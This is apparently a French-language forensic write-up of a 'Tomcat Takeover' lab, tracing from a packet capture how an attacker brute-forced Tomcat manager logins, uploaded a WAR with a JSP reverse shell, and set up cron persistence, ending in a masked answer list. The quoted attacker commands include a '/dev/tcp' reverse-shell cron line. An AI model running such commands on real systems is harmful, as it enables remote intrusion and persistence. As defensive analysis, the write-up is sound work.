# Notes FR — Tomcat Takeover Lab

## Contexte

Analyse d’un fichier PCAP nommé :

```text
web server.pcap
```

Objectif : identifier une compromission Tomcat, documenter les traces réseau et produire un rapport exploitable en contexte SOC.

## Adresses observées

| IP | Rôle |
|---|---|
| `**********` | Serveur victime |
| `**********` | Attaquant |
| `**********` | Activité utilisateur/navigation légitime probable |

## Service ciblé

```text
**********:****
```

Le port `****` correspond à Apache Tomcat.

## Requêtes HTTP importantes

Requêtes générales :

```bash
tshark -r "web server.pcap" -Y "http.request" -T fields -e frame.time_relative -e ip.src -e ip.dst -e tcp.dstport -e http.request.method -e http.host -e http.request.uri -e http.user_agent
```

Indicateur important :

```text
************
```

## Chemins sensibles découverts

```text
/*******
/*******/
/*******/html
/*******/list
/*******/status
/host-manager
/admin
/admin-console
/webdav
/status
```

## Authentification Basic

Commande utilisée :

```bash
tshark -r "web server.pcap" -Y 'http.authorization || http.authbasic || http.request.uri contains "/*******/html"' -T fields -E separator='|' -e frame.number -e frame.time_relative -e ip.src -e http.request.method -e http.request.uri -e http.authorization -e http.authbasic
```

Identifiants testés :

```text
*****:*****
******:******
admin:
*****:******
******:******
*****:******
```

Identifiant valide :

```text
*****:******
```

## Upload WAR

Requête POST :

```text
/*******/html/upload
```

Fichier uploadé :

```text
******.***
```

Chemin déployé :

```text
/******/
```

## Extraction du WAR

Fichiers extraits :

```text
WEB-INF/
WEB-INF/web.xml
********.***
```

Commande d’extraction utilisée :

```bash
tshark -r "web server.pcap" -Y 'frame.number == 20616' -T fields -e http.file_data | xxd -r -p > upload_raw.bin
```

Puis extraction de la signature ZIP/WAR :

```python
from pathlib import Path

raw = Path("upload_raw.bin").read_bytes()
start = raw.find(b"PK\x03\x04")

if start == -1:
    raise SystemExit("[ERREUR] Signature ZIP/WAR PK introuvable")

war = raw[start:]
boundary = war.find(b"\r\n----------------")

if boundary != -1:
    war = war[:boundary]

Path("******.***").write_bytes(war)
```

## JSP malveillante

Fichier :

```text
********.***
```

Comportement observé :

- choix du shell selon l’OS ;
- exécution de `/bin/sh` ou `cmd.exe` ;
- création d’une socket ;
- redirection des flux du shell vers la socket.

Code suspect :

```java
Process process = Runtime.getRuntime().exec(ShellPath);
```

## Reverse shell

Flux identifié :

```text
tcp.stream == ****
```

Connexion :

```text
**********:***** -> **********:80
```

Commande de suivi :

```bash
tshark -r "web server.pcap" -q -z follow,tcp,ascii,****
```

Commandes observées :

```bash
whoami
cd /tmp
pwd
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/443 0>&1'" > cron
crontab -i cron
crontab -l
```

Résultat :

```text
****
```

## Persistance

Commande cron :

```cron
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/443 0>&1'
```

## Hashes SHA256 des preuves

```text
b0f9ed31b467a45f2ec77338b1b17fb455463423eb70593a4a64cb969c0de188  evidence/******.***
bc06cf70994c655b3f558c820c570e43b7dc52b990e11a10b6856d19b84c5e41  evidence/upload_raw.bin
88a7b5d5ebfbed35e86cddac74893685252c762bdc152942a57e0809e0e9bfad  evidence/reverse_shell_stream_****.txt
6838dd4e167551f7910d2ce6ef23aeaf4f325c897cd5f1d70ee00492d8ceb1c0  evidence/tomcat_takeover_findings.md
bc4900bad640e4937eb70575de02bea6541130e478d2c50d4cc4b2ca4dad4d22  evidence/extracted_war/********.***
3c309168f34178227b65c752ff563db78d769c7c389a6c822a97523d575584a3  evidence/extracted_war/WEB-INF/web.xml
```

## Résumé des réponses

```text
Q1: **********
Q2: *****
Q3: ****
Q4: ********
Q5: /*******
Q6: *****:******
Q7: ******.***
Q8: * * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/*** 0>&1'* * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/443 0>&1'
```
